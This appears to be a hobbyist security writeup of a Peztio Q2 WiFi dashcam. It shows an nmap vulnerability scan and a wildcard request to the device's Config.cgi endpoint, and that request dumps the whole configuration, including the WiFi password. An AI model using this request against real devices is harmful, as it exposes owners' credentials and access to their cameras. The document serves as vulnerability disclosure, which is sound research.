# PeztioQ2
Q2-2K QHD WiFi Dashcam Writeup

## NMAP Scan 
```
$ nmap 192.168.1.1 -Pn --script vuln -p- -T5
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 19:27 MST
PORT    STATE SERVICE
23/tcp  open  telnet
80/tcp  open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
554/tcp open  rtsp
```
Telnet in 2023? What is this world coming too.

After messing around with the camera app and using a rooted andriod devce to capture the traffic I was able to locate this endpoint
```
http://192.168.1.1/cgi-bin/Config.cgi?action=get&property=Camera.Menu.AutoRec=OFF
```
Hmmmm I wonder what happens when I pass a wildcard....
```
http://192.168.1.1/cgi-bin/Config.cgi?action=get&property=*

Camera.Menu.ImageRes=2M
Camera.Menu.ImageQuality=Fine
Camera.Menu.BurstShot=3_1SEC
Camera.Menu.VideoRes=1440P30fps
Camera.Menu.VideoQuality=Super Fine
Camera.Menu.MicSensitivity=Standard
Camera.Menu.VideoPreRecord=OFF
Camera.Menu.VideoClipTime=1MIN
Camera.Menu.LoopingVideo=1MIN
Camera.Menu.VideoOffTime=0
Camera.Menu.RecordWithAudio=ON
Camera.Menu.MotionVideoTime=10s
Camera.Menu.AutoRec=OFF
Camera.Menu.Timelapse=1fps/s
Camera.Menu.SlowMotion=x1
Camera.Menu.HDR=ON
Camera.Menu.WNR=OFF
Camera.Menu.NightMode=OFF
Camera.Menu.ParkingMonitor=DISABLE
Camera.Preview.Adas.LDWS=0
Camera.Preview.Adas.FCWS=0
Camera.Preview.Adas.SAG=0
Camera.Menu.Contrast=50
Camera.Menu.Saturation=50
Camera.Menu.Sharpness=255
Camera.Menu.Gamma=50
Camera.Menu.SCENE=Auto
Camera.Menu.EV=EV0
Camera.Menu.ISO=ISO_AUTO
Camera.Menu.AWB=Auto
Camera.Menu.color=natural
Camera.Menu.effect=noraml
Camera.Menu.Flicker=50Hz
Camera.Menu.Brightness=50
Camera.Menu.Hue=50
Camera.Menu.PlaybackVolume=7
Camera.Menu.Beep=ON
Camera.Menu.AutoPowerOff=never
Camera.Menu.DateTimeFormat=YMD
Camera.Menu.TimeStampLogoTXT=date
Camera.Menu.GpsStamp=ON
Camera.Menu.SpeedStamp=OFF
Camera.Menu.Language=English
Camera.Menu.USB=MSDC
Camera.Menu.PowerSaving=OFF
Camera.Menu.GSensorSensitivity=LEVEL2
Camera.Menu.GSensorPowerOnSens=LEVEL2
Camera.Menu.GSensor=LEVEL4
Camera.Menu.TimeZone=GMT
Camera.Menu.MotionSensitivity=OFF
Camera.Menu.MTD=OFF
Camera.Menu.WiFi=ON
Camera.Menu.UIMode=VIDEO
Camera.Menu.Q-SHOT=ON
Camera.Menu.SoundIndicator=ON
Camera.Menu.SpotMeter=OFF
Camera.Menu.StatusLights=ON
Camera.Menu.UpsideDown=flip
Camera.Menu.SD0=READY
Camera.Menu.SDInfo=ON
Camera.Menu.Shutter=0
Camera.Menu.VoiceSwitch=ON
Camera.Preview.RTSP.av=4
Camera.Preview.Source.1.Camid=front
Net.WIFI_STA.AP.Switch=AP
Net.Dev.1.Type=AP
Playback=exit
Camera.Preview.MJPEG.status.MovieAudio=OFF
Camera.Menu.PhotoBurst=3_1SEC
Camera.Menu.RearStarus=OFF
Camera.Menu.PowerOffDelay=5SEC
Camera.Menu.SoundRecord=ON
Camera.Menu.TimeLapseRecord=24HOUR
Camera.Menu.Flip.Sensor=OFF
Camera.Menu.VideoSOS=ON
Camera.Menu.PWD=mypassword124
Camera.Menu.ParkingGuard=OFF
Camera.Menu.TimelapsePowerOff=OFF
Camera.Menu.RecStamp=DATELOGO
Camera.Menu.Volume=5
Camera.Menu.DeviceLanguage=0
Camera.Menu.DeviceType=OL_SSC337_D101
Camera.Menu.PlayBackMode=1
Camera.Menu.product=Q2@PEZTIO
Camera.Menu.sp=OULI
Camera.Menu.MirrorFlip=11
MagicNumber=12345678
Camera.Menu.mac=5477878355AB
Camera.Menu.devid=5477878355AB
Heartbeat=
Camera.Menu.HDRON=
Camera.Menu.SSID=MyPasswordIs12345678

```
